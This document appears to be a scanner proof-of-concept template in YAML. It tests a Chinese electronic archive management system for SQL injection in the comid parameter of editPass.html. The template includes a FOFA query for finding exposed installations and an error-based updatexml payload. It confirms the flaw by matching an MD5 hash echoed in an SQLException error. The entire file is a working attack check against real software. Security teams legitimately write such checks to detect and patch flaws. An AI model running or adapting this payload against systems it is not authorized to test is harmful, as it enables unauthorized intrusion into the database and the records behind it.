id: poc-yaml-thams-editpass-sqli
info:
  name: 紫光电子档案管理系统editPass.html存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 紫光电子档案管理系统
  fofa: app="紫光档案管理系统"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /login/Login/editPass.html?comid=(updatexml(1,concat(0x7e,(select%20md5({{.t1}})),0x7e),1))
  expression: "contains(body,\"SQLException\") && \ncontains(body,substr(t2,0,31))\n"
transport: http
